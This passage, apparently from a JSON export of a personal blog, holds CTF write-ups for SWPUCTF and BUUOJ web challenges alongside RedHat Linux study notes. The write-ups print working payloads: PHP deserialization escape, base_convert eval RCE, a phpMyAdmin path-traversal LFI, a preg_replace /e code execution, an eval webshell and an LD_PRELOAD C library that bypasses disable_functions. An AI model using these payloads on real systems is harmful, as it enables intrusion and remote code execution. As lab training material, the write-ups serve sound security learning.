，摸了一题就溜去复习了。\n耗子为汁下载gif文件，先做gif分帧，发现没有东西。所以使用binwalk分析文件，发现有隐藏文件，所以binwalk分离，这里foremost有问题，得不到后面关键的视频文件。\nbinwalk后会有一个flag.txt可惜是假flag，然后有一个闪电五连鞭的视频，发现视频里有一个base64一闪而过，所以使用ffmpeg进行视频分帧，我是设置为1秒30帧，成功找到了那张base64图。\n\nc2lnbl9pbg==解开后是 sign_in\n然后可以去解压被加密的压缩包\n得到一个19-20.txt文件\nR1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D;\n\n解码base64得到一个base32字符串：\nGZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D;\n\n解码base32得到一个base16字符串：\n6C76756569616B7875647379716568737A7168796B67677379796C6B767669\n\n转换一下：\nlvueiakxudsyqehszqhykggsyylkvvi\n\n根据flag格式，进行处理一下：\nlvue iak xuds yqehsz qh ykggsyylkvvi\nflag      a     g              f ll     \n\n然后感觉有点考英语的感觉了，看到最后一个单词有gg有yy，猜测是successfully\n然后对应字母，反推其他位置，发现和开头的flag是符合的。推测加猜测最后得到\nflag you have signed in successfully\nflag&#123;you_have_signed_in_successfully&#125;\n\n后来看了官方WP，发现是仿射密码。\n","slug":"SWPUCTF杂项","date":"2020-12-06T05:19:56.000Z","categories_index":"CTF","tags_index":"SWPUCTF2020","author_index":"A1andNS"},{"id":"999661aa590b0d9c1b6b86c3a8e07f94","title":"BUUOJ刷题20201028-29","content":"[ASIS 2019]Unicorn shop考点：Python、UTF-8、Unicode\n直接提交信息，无法成功，前端源码提示\n&lt;meta charset=\"utf-8\">&lt;!--Ah,really important,seriously. -->\n\n&lt;!--We still have some surprise for admin.password-->\n\n一个是管理员密码的点，还有一个是utf-8编码，bp抓包看看\n操作失败有多种：no commodity found！、wrong commodity、only one char(?) allowded！、Error parsing money!\n这前三个id有点迷，提示商品错误，当时id=4是money不够，当是字符又限制，所以我们可能需要找一个uft-8编码的对应value较大的值，至少大于1337，这样他就可以被解析为一个很大的值，从而购买。\nUnicode字符可以查找：Unicode - Compart\nↈ这个就是我选择的符号了\nUTF-8 Encoding:\t0xE2 0x86 0x88\n\n把他作为price传入，就可以得到flag了，这个感觉和ssrf时用字符串来替代数字IP原理类似\n[0CTF 2016]piapiapia考点：反序列化字符串逃逸\n后台扫描，可以得到很多信息，先去注册一下。然后可以登录一下注册的账号。\n\n会到达一个信息更新界面，有一个上传点，我可以先审计一下源码。通过代码审计可以知道再profile.php中存在一个unserialize()点。$profile参数是来自user对象的show_profile函数，跟进到class.php里看看user类。在update.php中则是与之对应的一个序列化点。跟进去看一下，他对我们的输入会做过滤，然后调用update_profile,并且对我输入信息进行序列化，跟进到update_profile函数，在class.php文件中，然后它调用了filter函数，继续跟进，是过滤，另一个是update函数，跟进是更新数据库。\n大概就是先正则表达式对参数做过滤，然后序列化，再对非法值做替换，然后写入数据库。\nphp反序列化字符串逃逸，利用数组来绕过nikename的字符长度限制。我们的目标就是在photo设置config.php，因为flag就在其中。config.php字符串长度的10，我们需要溢出的内容应该为\n&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;config.php&quot;;&#125;\n\n长度为34，所以我们需要利用where的替换hacker，来挤占空间，每一个where只能挤出一个空间，所以需要34个where才行。\npayload:\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;\n\n\n\n[CISCN 2019 初赛]Love Math考点：代码审计\n&lt;?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c']))&#123;\n    show_source(__FILE__);\n&#125;else&#123;\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) &#123;\n        die(\"太长了不会算\");\n    &#125;\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) &#123;\n        if (preg_match('/' . $blackitem . '/m', $content)) &#123;\n            die(\"请不要输入奇奇怪怪的字符\");\n        &#125;\n    &#125;\n    //常用数学函数 \n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) &#123;\n        if (!in_array($func, $whitelist)) &#123;\n            die(\"请不要输入奇奇怪怪的函数\");\n        &#125;\n    &#125;\n    //帮你算出答案\n    eval('echo '.$content.';');\n&#125;\n\n通过代码审计可以发现payload长度不能超过80，payload中不能出现’ ‘, ‘\\t’, ‘\\r’, ‘\\n’,’&#39;‘, ‘“‘, ‘`’, ‘[‘, ‘]‘,并且还有一个限制就是payload中不能有不是$whitelist白名单里面的单词。\n可以发现这里面有进制转换函数，进制转换只要进制够大，我们就可以从十进制转换成我们想要的字符，并且php中函数名都是默认使用字符串储存，也就是说一个和函数名一样的字符串，可以用来执行函数，例如：$a=system;$a(‘ls’);\n注意到这里的进制转换函数中有一个比较好用的函数，那就是base_convert函数,它可以实现2-36进制之间的转换。\n?c&#x3D;base_convert(1751504350,10,36)(base_convert(784,10,36))\n\n这样我传入后，实际执行了system(ls)\npayload:\n?c&#x3D;base_convert(1751504350,10,36)(base_convert(8768397090111664438,10,30)()&#123;1&#125;)\n\nflag一闪而过，看来是有重定向，那就用bp来抓个包试一下。\n\n总结：这里首先考察了代码审计，了解改页面的整体情况。白名单和黑名单的waf需要绕过，数学函数中的进制转换函数被利用，来实现用十进制数进制转换为其他函数字符，以实现RCE。之所以可以实现这一点还是PHP的函数名以字符串格式保存，所以可以使用字符串()来实现函数执行，这就是为什么我们通过进制转换还原函数名结合()没被过滤，就可以实现eval来函数执行。这里是用了getallheads，因为这里很明显通过这种方式传入执行命令时最舒服的。hex2bin()函数也是可以使用的，它可以将16进制转换为ascii码，也是一大利器，转换出_GET然后使用{}来代替[]，就可以创造一个新的get参数。\n","slug":"BUUOJ刷题20201028-29","date":"2020-11-30T12:13:59.000Z","categories_index":"CTF","tags_index":"BUUOJ,ASIS2019,OCTF2016","author_index":"A1andNS"},{"id":"fd1d8d0cd37eabf9d916bbc0522132cf","title":"RedHat学习(四)","content":"前言Redhat系列继续，Linux冲鸭！\n用户身份与文件权限前面说过了Linux是一个多用户、多任务的操作系统，具有很好的稳定性和安全性。而不用用户之间的文件，就有一个ACL问题了，也就是访问控制，那么就涉及到文件属性中的权限，谁有权力去读取和修改它。在Linux系统中UID就是识别用户身份的身份证号码，不同的用户拥有不同的UID。\n用户身份有哪些\n\n\n\n\n\n\n\n\n\n\n管理员UID为0：系统的管理员用户\n\n系统用户UID1-999：linux系统为了避免某个服务出现漏洞而被黑客利用提权到整体服务器就会，让默认服务程序由默认的独立系统用户来负责运行，从而有效控制破坏面。\n\n普通用户UID从1000开始：是由管理员创建的用于日常工作的用户\n\n\n除了UID，linux还引入了一个用户组概念，从而就有了用户组ID，也就是GID，我们可以把多个用户加入到同一个组中去。这里由一个基本用户组和拓展用户组，基本用户组是在系统中创建一个用户是，会自动创建一个与其同名的基本用户组，而该用户如果归纳入其他用户组，则这个其他用户组就成为拓展用户组。\nuseradduseradd命令用于创建一个新用户,使用该命令创建用户账户是，默认的用户家目录会被存放在/home目录中，默认的解释为/bin/bash，而且默认会创建一个与用户同名的基本用户组。j具体怎么使用，自己用-h或者man去查一下吧。可以指定目录和解释器等等。\nuseradd -d /home/hahaha -u 6666 -s /sbin/nologin a1andns\n\n这样我就创建了一个a1andns用户，并且我指定了他的目录为/home/hahaha，UID为6666，解释器为/sbin/nologin代表不允许登录\n参考文献《Linux就该这么学》\n","slug":"RedHat学习-四","date":"2020-11-16T05:37:25.000Z","categories_index":"Linux学习","tags_index":"Linux,Redhat","author_index":"A1andNS"},{"id":"c1bcca257a4c5447e48fa38583f46a58","title":"RedHat学习(三)","content":"Vim文本编辑器之前也是已经使用过了，这个是个Linux上必备应用，基本上市面上的Linux发行版也都已经内置了这个文本编辑器了。vim编辑器有三种模式，分别是命令模式、末行模式、编辑模式。\n\n命令模式：控制光标移动，可以对文本进行复制、粘贴、删除和查找\n输入模式：可以进行文本写入\n末行模式：保存或退出文档，以及设置编辑环境。\n\n这个切换也比较简单，在启动vim编辑器时，默认时处于命令模式，而我们要切换到命令模式就只需要输入a、i、o中的任意一个就好了。a是进在光标的后一位进入编辑模式，i是在当前光标处进入编辑模式，o是另起一行进入编辑模式。\n下面再看看vim中的常用命令：\n\n\n\n命令\n作用\n\n\n\ndd\n删除（剪切）光标所在整行\n\n\n5dd\n删除（剪切）光标开始的5行\n\n\nyy\n复制光标所在整行\n\n\n5yy\n复制光标开始的5行\n\n\nn\n显示搜索命令定位到的下一个字符串\n\n\nN\n显示搜索命令定位到的上一个字符串\n\n\nu\n撤销上一步的操作\n\n\np\n将之前删除或复制的数据粘贴到光标的后面\n\n\n末行模式中可以使用的命令\n\n\n\n命令\n作用\n\n\n\n:w\n保存\n\n\n:q\n退出\n\n\n:q!\n强制退出\n\n\n:wq!\n强制保存退出\n\n\n:set nu\n显示行号\n\n\n:set nonu\n不显示行号\n\n\n:命令\n执行此命令\n\n\n:整数\n跳转到该行\n\n\n直接上手试一下，就知道如何简单使用vim了。\n网卡配置文件很有趣，在RHEL7之前的系统都是用eth前缀的文件来存储配置文件。而在RHEL7后改用了ifcfg开头的文件。例如我通过查询ifconfig，得到我的网卡名称为eno16777728，所以我的配置文件名称ifcfg-eno16777728，而配置文件位置没有变在/etc/sysconfig/network-scripts\nShell脚本Shell是用户与Linux系统内部的通信媒介。它的工作方式有两种：交互式和批处理。\n\n交互式：用户没输入一条命令就立即执行\n批处理：由用户事先编写好一个完整的Shell脚本，Shell会一次性执行脚本中诸多的命令。\n\n那么Shell脚本要这么编写呢？一个简单的Shell脚本，就是把Linux命令按照顺序写入到一个文件中。\n#!/bin/bash\n#this is the test\npwd\nls -al\n\n练习一下vim，用vim来写一个这个简单shell。\n[root@linuxprobe ctf]# sh test.sh \n/home/ctf\ntotal 4\ndrwxr-xr-x. 2 root root 20 Nov 10 19:33 .\ndrwxr-xr-x. 4 root root 30 Nov 10 16:39 ..\n-rw-r--r--. 1 root root 42 Nov 10 19:33 test.sh\n\n如果直接运行一下test.sh脚本,权限不够，那是因为没有添加运行权限。\n[root@linuxprobe ctf]# ./test.sh\nbash: ./test.sh: Permission denied\n[root@linuxprobe ctf]# ls -l\ntotal 4\n-rw-r--r--. 1 root root 42 Nov 10 19:33 test.sh\n[root@linuxprobe ctf]# chmod +x test.sh \n[root@linuxprobe ctf]# ls -l\ntotal 4\n-rwxr-xr-x. 1 root root 42 Nov 10 19:33 test.sh\n[root@linuxprobe ctf]# ./test.sh \n/home/ctf\ntotal 4\ndrwxr-xr-x. 2 root root 20 Nov 10 19:33 .\ndrwxr-xr-x. 4 root root 30 Nov 10 16:39 ..\n-rwxr-xr-x. 1 root root 42 Nov 10 19:33 test.sh\n\n添加了运行权限后就可以正常执行了。\n获取用户参数在运行一些shell脚本的时候需要去接受一些来自用户的输入。\n例如\n.&#x2F;test.sh str1 str2 str3 str4\n\n那么一个shell脚本如何来获取到这些输入呢？\n这就要使用到一些内置变量了。\n\n$*:所有用户输入参数\n$?:上次命令执行的返回值\n$1、$2……:分别对应第N个位置的参数值\n$#:参数的总个数\n\n条件测试语法条件测试语句可以分为4种:\n\n文件测试语句\n逻辑测试语句\n整数值比较语句\n字符串比较语句\n\n格式是：[ 条件表达式 ]\n必须注意的是空格不能省略\n文件测试看看文件测试的常用参数\n\n\n\n运算符\n作用\n\n\n\n-d\n测试文件是否为目录类型\n\n\n-e\n测试文件是否存在\n\n\n-f\n判断是否为一般文件\n\n\n-r\n测试当前用户是否有权限读取\n\n\n-w\n测试当前用户是否有权限写入\n\n\n-x\n测试当前用户是否有权限执行\n\n\n[ -e /etc/passwd ]如果文件/etc/passwd存在就会返回0，否则就返回任意一个非零的值。\n逻辑表达式[ $USER = root ]，如果当前用户是root就会返回0，否则就是返回一个1。\n其实就是一个要点，这个条件判断式，成立就返回0，不成立就返回1\n整数比较整数比较运算符，这个不用&gt;等符号来表示大于等关系，因为这些符号在前面的管道符里已经被使用了，避免出现歧义。\n\n\n\n运算符\n作用\n\n\n\n-eq\n是否等于\n\n\n-ne\n是否不等于\n\n\n-gt\n是否大于\n\n\n-lt\n是否小于\n\n\n-le\n是否等于或小于\n\n\n-ge\n是都大于或等于\n\n\n[ 10 -eq 10 ]的结果是0\n至于与&amp;&amp;和||结合使用，例如格式是条件判断 &amp;&amp; echo &quot;yes&quot;或条件判断 || echo &quot;yes&quot; \n&amp;&amp;的是条件成立就执行右边，也就是左边执行成功，就执行右边\n||的是条件不成立就执行右边，也就是左边执行失败，就执行右边\n[root@a1andns ctf]# mem=`free -m | grep Mem: | awk '&#123;print $4&#125;'` &amp;&amp; [ $mem -lt 1024 ] &amp;&amp; echo \"Insufficient Memory\"\nInsufficient Memory\n\n综合利用，查询内存用量中剩余内存，并且和1024比较，如果小于1024，输出内存不足。\n字符串比较字符串比较语句用于判断测试字符串是否是空值，或两个字符串是否相同。\n\n\n\n运算符\n作用\n\n\n\n=\n比较字符串内容是否相同\n\n\n!=\n比较字符串内容是都不同\n\n\n-z\n判断字符串内容是否为空\n\n\n[root@a1andns ctf]# [ -z $String ]\n[root@a1andns ctf]# echo $?\n0\n[root@a1andns ctf]# echo $LANG\nen_US.utf8\n[root@a1andns ctf]# [ $LANG != \"en_US\" ] &amp;&amp; echo \"not en.US\"\nnot en.US\n[root@a1andns ctf]# [ $LANG = \"en_US.utf8\" ] &amp;&amp; echo \"this is en.US.uft8\"\nthis is en.US.uft8\n\n流程控制语句简单地把命令写入肯定是不够的，那么就需要一些别的模块辅助，所以就可以看看流程控制语句了。\nif条件测试语句if条件测试语句可以分为单分支结构、双分支结构、多分支结构。\n单分支结构由if、then、fi关键词组成。\n#!/bin/bash\nDIR=\"/media/cdrom\"\nif [ ! -e $DIR ]\nthen\nmkdir -p $DIR\nfi\n\n双分支结构由if、then、else、fi关键词组成\n#!/bin/bash\nping -c 3 -i 0.2 -W 3 $1 $> /dev/null\nif [ $? -eq 0 ]\nthen\necho \"Host $1 is On-line.\"\nelse\necho \"Host $1 is Off-line.\"\nfi\n\n多分支结构由if、then、else、elif、fi关键词组成。\n#!/bin/bash\nread -p \"Enter The Score:\" SCORE\nif [ $SCORE -ge 85 ] &amp;&amp; [ $SCORE -le 100 ] ; then\necho \"$SCORE is Excellent\"\nelif [ $SCORE -ge 70 ] &amp;&amp; [ $SCORE -le 84 ] ; then\necho \"$SCORE is Pass\"\nelse\necho \"$SCORE is Fail\"\nfi\n\nfor条件循环语句for语句允许脚本一次性读取多个信息，然后逐一对信息进行操作处理。\n#!/bin/bash\nread -p \"Enter the users password:\" PASSWD\nfor UNAME in `cat users.txt`\ndo\nid UNAME $> /dev/null\nif [ $? -eq 0 ]\nthen\necho \"Already exists\"\nelse\nuseradd $UNAME &amp;> /dev/null\necho \"$PASSWD\" | passwd --stdin $UNAME &amp;> /dev/null\nif [ $? -eq 0 ]\nthen\necho \"$UNAME , Create success\"\nelse\necho \"$UNAME , Create failture\"\nfi\nfi\ndone\n\nwhile条件循环语句while条件循环语句是一种让脚本根据某些条件重复执行命令的语句，它的循环结构往往在执行前并不确定最终执行次数。\n#!/bin/bash\nPRICE=$(expr $RANDOM % 1000)\nTIMES=0\necho \"商品实际价格为0-999之间，猜猜看是多少？\"\nwhile true\ndo\nread -p \"请输入你猜测的价格类目：\" INT\nlet TIMES++\nif [ $INT -eq $PRICE ] ; then\necho \"恭喜你答对了，实际价格是$PRICE\"\necho \"您总共猜测了$TIMES次\"\nexit 0\nelif [ $INT -gt $PRICE ] ; then\necho \"太高了\"\nelse \necho \"太低了\"\nfi\ndone\n\n#格式\nwhile 条件测试语句\ndo\n命令序列\ndone\n\ncase条件测试语句类似于c的switch语句，语法结构如下：\ncase 变量 in\nmode1）\n\t命令序列1\n\t;;\nmode1)\n\t命令序列2\n\t;;\n*)\n\t默认命令序列\nesac\n\n计划任务服务程序计划任务是是实现运维自动化的重要工具，计划任务分为一次性计划任务与长期性计划任务\n\n一次性计划任务：今晚11点30分开启网站服务\n长期型计划任务：每周一的凌晨3点3分把/home/wwwroot目录打包备份为backup.tar.gz\n\n写一次性计划任务使用at命令来设置\nat 23:30\nat&gt; systemctl restart httpd\n#Use Ctrl+D to complete this setting\n#OR\necho “systemctl restart httpd” | at 23:30\n#查看一次性任务计划列表\nat -l\n#删除一个一次性计划任务,&quot;3&quot;为一次计划任务的序号\natrm 3\n\n长期任务计划的创建、编辑计划任务的命令为crontab -e，而查看当前计划任务的命令为crontab -l\n格式为分、时、日、月、星期 命令\ncrontab -e\n25 3 * * 1,3,5 &#x2F;usr&#x2F;bin&#x2F;tar -czvf backup.tar.gz &#x2F;home&#x2F;wwwroot\ncrontab -l\n\n其中,用来分别多个时间段，例如1,3,5表示了星期一、三、五，除此之外还可以使用-来表示一个时间段，例如在日字段写12-15,就是表示12日到15日。\n注意点\ncrond服务的配置参数，可以像shell脚本一样使用#来写注释信息，这样就可以在日后快熟回顾这段命令的作用。还有就是在分字段，不能使用空或者,因为分钟无时不在，如果使用空，那么定时任务恐怕永远不会执行，而使用*的话，一直在执行。日与星期也不能同时使用，因为这样日和星期是有可能发生冲突的。*\n参考文献《Linux就该这么学》\n","slug":"RedHat学习-三","date":"2020-11-10T10:35:20.000Z","categories_index":"Linux学习","tags_index":"Linux,Redhat","author_index":"A1andNS"},{"id":"1f9ed3837271c9618e2c89b56e8e0ee6","title":"BUUOJ刷题2020119-15","content":"[BJDCTF2020]Mark loves cat考点：git泄露、代码审计、变量覆盖\n只发现最下面有一个交互点，这是一个提交留言的交互点的样子，提交试一下，发现会在GET传参message。\n但是有一个奇怪的地方，index.html?message=1111111\n但是这个参数并没有被嵌入到网页，所以这个方向应该不行，网页上收集不到什么信息，那么就去后台扫描一下。\n\n发现了git泄露，之下好办了，githack来一手。\n不知为啥我的githack都不太好使，一会靠谱，一会不靠谱，试了好几次，得到了一个flag.php,这是用来读取flag的，关键应该还是index.php了，试了好几次，终于得到index.php\n&lt;?php\n\ninclude 'flag.php';\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y)&#123;\n    $$x = $y;\n&#125;\n\nforeach($_GET as $x => $y)&#123;\n    $$x = $$y;\n&#125;\n\nforeach($_GET as $x => $y)&#123;\n    if($_GET['flag'] === $x &amp;&amp; $x !== 'flag')&#123;\n        exit($handsome);\n    &#125;\n&#125;\n\nif(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag']))&#123;\n    exit($yds);\n&#125;\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag')&#123;\n    exit($is);\n&#125;\n\n\n\necho \"the flag is: \".$flag;\n\n下面就是审计一下了。\n这里有两个条件语句都会直接结束程序，所以必须绕过，先看第一个if语句。要绕过这个if需要get类型或post类型设置，第二个if语句呢，那么post类型和get类型的flag都不能为”flag”才行。\nhttp:&#x2F;&#x2F;3d723423-9528-4639-9d22-5cf10abd4bb1.node3.buuoj.cn?flag&#x3D;123\n\n\nflag&#x3D;123\n\n\n这样就可以绕过两个if的限制，但是前面的三个foreach还需要处理一下。首先的问题是如何不让flag被覆盖，这里flag如果用flag[]来绕会出问题，flag还是被覆盖为array了，所以方向可能错了。\n方法一看看能不能使用别的程序出口。前面有说if如果满足条件就会退出程序。第二个if的出口会返回$is的值，那我们就想办法来覆盖$is变量。首先传入一个get类型的变量flag=flag,来触发程序退出，同时传入一个is=flag来吧flag覆盖is变量。\n上面过程相当于再foreach循环中做了如下操作：\n$flag=$flag;\n$is=$flag;\n#程序出口时\nexit($is);\n\n\n同理还可以利用其他程序出口来构造。\n方法二例如使用第一个if语句的出口，那么这样构造payload：\n\n方法三利用第一个exit()出口\n\n[GWCTF 2019]我有一个数据库考点：POC查找利用\n上来上面都没有，先用dirsearch收集一下信息。\n\n访问一下robots.txt，得到的是一个phpinfo.php的存在。\n那就直接去访问一下phpinfo.php吧\n可以看到3306端口有开放一个mysql服务，刚好上面也发现了phpmyadmin的存在，走起。\n不用登录直接连接成功。但是要这么找到flag呢，大概找了一下，没有找到。看了一下phpmyadmin的把呢不能是4.8.1，那么看看是否存在漏洞。用kali的searchsploit命令找一下\n\n找到了poc:\nhttp:&#x2F;&#x2F;47544777-c497-4fa9-ab0a-0305b40218fc.node3.buuoj.cn&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag\n\n这里要使用多一个../的原因是，这个payload传入的是否会进行一次解码，这样的话target=db_sql.phptarget=db_sql.php%3f/../../../../../../flag，而db_sql.php%3f/被当作一个目录了，所以需要多一个../才行。\n[BJDCTF2020]The mystery of ip考点：模板注入\n这题一开始就发现了使用X-Forwarded-For来伪造IP，然后发现xxf里的内容可以嵌入到HTML里，于是就尝试往网页里构造php脚本来运行。\n&lt;/h2>&lt;script language=\"php\">phpinfo();&lt;/script>\n\n脚本成功嵌入，但是似乎并没有执行。这里就很懵逼了，后来也是试了很多次，但是方向都错了，只好去看了一下wp，发现居然是考察ssti，这点当时没有想到，一个可以返回输入值的点，我居然没有往ssti上想确实是秀逗了。\n\n执行命令，获取flag\n\n[BJDCTF2020]ZJCTF，不过如此考点：代码审计、php伪协议\n&lt;?php\n\nerror_reporting(0);\n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\nif(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\"))&#123;\n    echo \"&lt;br>&lt;h1>\".file_get_contents($text,'r').\"&lt;/h1>&lt;/br>\";\n    if(preg_match(\"/flag/\",$file))&#123;\n        die(\"Not now!\");\n    &#125;\n\n    include($file);  //next.php\n    \n&#125;\nelse&#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n这里看到file_get_content($text,”r”)马上想到使用php伪协议中的data协议来做。\nhttp:&#x2F;&#x2F;926d16d4-6a64-4e8b-9dd7-6194602ef134.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php\n\n得到next.php源码\n&lt;?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) &#123;\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n&#125;\n\n\nforeach($_GET as $re => $str) &#123;\n    echo complex($re, $str). \"\\n\";\n&#125;\n\nfunction getFlag()&#123;\n\t@eval($_GET['cmd']);\n&#125;\n\n\n这里考察的是preg_replace()函数的/e模式利用，这样的结果就是在匹配成功时就会执行replacement位置的语句（当做php代码执行）\n\n\n\n\n\n\n\n\n\n反向引用\n对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。\n这里看到了一篇红日安全团队的文章附在下面，和本地考点一致\nhttps://mp.weixin.qq.com/s?src=11&amp;timestamp=1605275162&amp;ver=2704&amp;signature=iWriq8iLi519U5ZyboIWK-tJIgGlK68TJ1In6ea4GqtuHP2nwfhWrSPUbantGCwl20-eGci--jLDH4LlnjKQ4jJa2DoJyiARRcsvZZSJvk9Kk46dv73Vff0DkzeLHV10&amp;new=1\npayload:\nhttp:&#x2F;&#x2F;926d16d4-6a64-4e8b-9dd7-6194602ef134.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;next.php&amp;\\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);\n\n利用\\s*=$&#123;getFlag()&#125;来确保匹配到完整的$&#123;getFlag()&#125;，这样在replacement位置执行的代码就是strtolower(&quot;$getFlag()&quot;),在一个函数中存在${}会认为这是一个变量，并且去执行其中的代码。所以就可以利用这点来调用getFlag()函数，然后传入cmd参数进行命令执行。\n[GKCTF2020]CheckIN考点：代码审计、绕过disable_funciton\n&lt;title>Check_In&lt;/title>\n&lt;?php \nhighlight_file(__FILE__);\nclass ClassName\n&#123;\n        public $code = null;\n        public $decode = null;\n        function __construct()\n        &#123;\n                $this->code = @$this->x()['Ginkgo'];\n                $this->decode = @base64_decode( $this->code );\n                @Eval($this->decode);\n        &#125;\n\n        public function x()\n        &#123;\n                return $_REQUEST;\n        &#125;\n&#125;\nnew ClassName();\n\n很简单的思路，传入一个参数Ginkgo，而这个Ginkgo的参数值会被传给this-&gt;code，然后会把code解base64给this-&gt;decode，再把this-&gt;decode做执行。\n所以先来看看phpinfo信息\nhttp:&#x2F;&#x2F;b99df589-6ade-4a95-bc85-9ad652b6185a.node3.buuoj.cn&#x2F;?Ginkgo&#x3D;cGhwaW5mbygpOw&#x3D;&#x3D;\n\ndisable_function:\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,\n\nsystem()被禁用了，scandir()不知怎么回事也是用不了。构造一个webshell来连接。\nhttp:&#x2F;&#x2F;b99df589-6ade-4a95-bc85-9ad652b6185a.node3.buuoj.cn&#x2F;?Ginkgo&#x3D;QGV2YWwoJF9QT1NUWydjbWQnXSk7\n\n在主根目录下，找到了flag,但是需要运行readflag才可以得到flag。所以需要绕过disable_function限制。\n这里用LD_PRELOAD预加载来绕过\n写一个C脚本：\n#include&lt;stdio.h>\n#include&lt;stdlib.h>\n#include&lt;unistd.h>\n\n__attribute__((__constructor__))void angel(void)\n&#123;\n    unsetenv(\"LD_PRELOAD\");\n    system(\"/readflag > /tmp/a1andns\");\n&#125;\n\n编译成hack.so文件\ngcc 1.c -shared -fPIC -o hack.so\n把他上传到tmp目录下，这个看心情随意。\n在web根目录下新建一个php文件\n&lt;?php \nputenv(\"LD_PRELOAD=/tmp/hack.so\");\nerror_log(\"\",1,\"\",\"\");\n?>\n\n然后去url处包含一下这个文件，include(&#39;/tmp/alan.php&#39;);就可以去tmp/a1andns查看flag了。\nhttp:&#x2F;&#x2F;b99df589-6ade-4a95-bc85-9ad652b6185a.node3.buuoj.cn&#x2F;?Ginkgo&#x3D;aW5jbHVkZSgnL3RtcC9hbGFuLnBocCcpOw&#x3D;&#x3D;\n\n\n\n[BJDCTF 2nd]假猪套天下第一考点：http\n使用admin账号登录，弹窗说你不是admin，任意其他账号登录，可以在前端源码里发现一个L0g1n.php的存在\n访问这个L0g1n.php\nSorry, this site will be available after totally 99 years!\n\n发现cookie有带时间戳，所以要先绕过第一步。\ntime&#x3D;4735115759\n\n然后又得到了新的提示\nSorry, this site is only optimized for those who comes from localhost\n\n使用xxf来绕过，得到的回复是\nDo u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive\n\n好像失败了，不能用xxf\nclient-ip: 127.0.0.1\n\n得到回显是：\nSorry, this site is only optimized for those who come from gem-love.com\n\n添加referer\nReferer: gem-love.com\n\n显示：\nSorry, this site is only optimized for browsers that run on Commodo 64\n\n修改UA\nUser-Agent: Commodo 64\n\n显示：\nno no no i think it is not the real commmodo 64, &lt;br&gt;what is the real ua for Commdo?\n\n修改UA\nUser-Agent: Commodore 64\n\n显示\nSorry, this site is only optimized for those whose email is root@gem-love.com\n\n添加From\nFrom: root@gem-love.com\n\n显示：\nSorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100&#x2F;Month\n\n添加via\nvia: y1ng.vip\n\n显示：\nSorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag &lt;!--ZmxhZ3s0ZTk2ZmVjMi0zNzNkLTRmMDktYjI0OS0wOTgzOTg5M2QxNmF9Cg&#x3D;&#x3D;--&gt;\n\n得到了flag\n[SUCTF 